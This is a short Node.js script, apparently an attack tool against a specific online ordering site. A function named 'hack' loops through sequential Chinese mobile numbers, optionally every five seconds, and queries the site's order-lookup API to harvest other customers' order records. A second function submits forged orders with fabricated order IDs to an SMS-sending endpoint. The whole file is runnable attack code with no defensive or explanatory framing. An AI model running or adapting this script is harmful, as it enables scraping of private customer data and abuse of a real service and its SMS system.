const fetch = require('node-fetch');

const order = async (tel) => {
  try {
    const currentDate = new Date();
    const trueDate = currentDate.getMonth() + 1;

    let not3num = '';
    for (let i = 0; i < 7; i += 1) {
      not3num += Math.floor(Math.random() * 10);
    }

    const orderID = `${currentDate.getFullYear()}${trueDate}${currentDate.getDate()}${currentDate.getHours()}${currentDate.getMinutes()}${currentDate.getSeconds()}${not3num}`;

    const res = await fetch(
      'http://lyq.txtsec.cn/index.php?s=/Home/Index/msg_send',
      {
        headers: {
          accept: '*/*',
          'accept-language': 'zh-CN,zh;q=0.9',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'x-requested-with': 'XMLHttpRequest',
        },
        referrerPolicy: 'strict-origin-when-cross-origin',
        body:
          `mobile=${tel}&goods_spec_str=a%3A1%3A%7Bi%3A0%3Ba%3A3%3A%7Bs%3A2%3A%22id%22%3Bs%3A3%3A%22153%22%3Bs%3A4%3A%22name%22%3Bs%3A1%3A%22P%22%3Bs%3A5%3A%22value%22%3Bs%3A52%3A%22P%E3%80%90%E4%B8%80%E7%B1%B3%E6%99%BA%E8%83%BD%E6%89%AB%E5%90%B8%E6%8B%963%E5%90%881%E6%89%AB%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%BA%BAT115%E3%80%91%22%3B%7D%7D&order_sn=${
            orderID}`,
        method: 'POST',
        mode: 'cors',
        credentials: 'include',
      },
    );

    const data = await res.json();
    console.log(data);
  } catch (error) {
    console.log(error);
  }
};

const check = async (tel) => {
  try {
    const res = await fetch(
      'http://lyq.txtsec.cn/index.php?s=/Api/Order/check_order',
      {
        headers: {
          accept: '*/*',
          'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
          'content-type': 'application/x-www-form-urlencoded',
          'proxy-connection': 'keep-alive',
        },
        referrerPolicy: 'strict-origin-when-cross-origin',
        body: `tel=${tel}&id=137754`,
        method: 'POST',
        mode: 'cors',
        credentials: 'include',
      },
    );

    const data = await res.json();

    if (data.order_list !== null) console.log(data);
  } catch (error) {
    console.log(error);
  }
};

const loop = (n) => {
  let x = 1;
  const startTel = 13700000000;
  while (x <= n) {
    const tel = startTel + x;
    check(tel);
    console.log(tel);
    x += 1;
  }
};

const hack = (n, timer = true) => {
  loop(n);
  if (timer) {
    setInterval(() => loop(n), 5000);
  }
};

hack(200, false);
